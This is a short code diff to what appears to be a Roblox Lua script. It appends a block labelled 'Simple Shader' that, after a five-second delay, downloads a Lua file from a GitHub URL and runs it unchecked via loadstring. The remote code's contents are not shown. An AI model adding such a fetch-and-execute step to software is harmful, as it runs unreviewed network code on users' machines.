@@ -344,3 +344,10 @@ engBtn.MouseButton1Click:Connect(function()
     gui.Enabled = true
     updateLanguage()
 end)
+
+
+-- Simple Shader
+task.spawn(function()
+    task.wait(5)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/p0e1/1/refs/heads/main/SimpleShader.lua"))()
+end)
